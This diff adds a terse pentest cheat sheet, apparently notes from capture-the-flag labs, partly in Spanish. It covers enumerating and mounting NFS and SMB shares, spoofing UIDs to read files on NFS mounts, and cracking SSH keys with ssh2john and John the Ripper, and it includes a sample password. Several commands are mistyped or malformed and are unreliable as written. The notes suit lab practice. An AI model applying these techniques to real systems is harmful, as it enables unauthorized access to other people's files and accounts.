@@ -1,0 +1,36 @@
+mkdir /mnt/kenobiNFS
+mount machine_ip:/var /mnt/kenobiNFS
+ls -la /mnt/kenobiNFS
+
+showmount -e ip
+apt-get install nfs-common
+mkdir /tmp/mount
+mount -t nfs ip /tmp/mount/
+mount -t nfs ip:/home/vulnix /tmp/mount/
+df -k
+
+mount -t ip:/home/karl /tmp/happycorp
+
+.ssh permison denegaden
+
+groupadd --gid 1001 rcp
+useradd -uid 1001 --group 1001 happycorp
+su happycorp
+
+ss2john.py
+nano key
+ss2john.py key > ssh
+john --wordlist=rock ssh
+
+mount -t cifs -o username=root  //10.10.10.134/Backups /mnt/
+
+https://resources.infosecinstitute.com/exploiting-nfs-share/
+
+mmount -t cifs //10.10.10.178/carpeta que quieras /mnt/smbmounted -o username=TempUser,password=welcome2019,domain=WORKGROUP,rw
+
+umount /tmp/carpeta
+
+mount -t cifs "" /mnt/smbmounted -o vers=2.1
+-o username=null,password=null
+
+mount -t cifs //ip/users mnt/smbmounted -o username=null,password=null,domain_WORKGROUP,rw
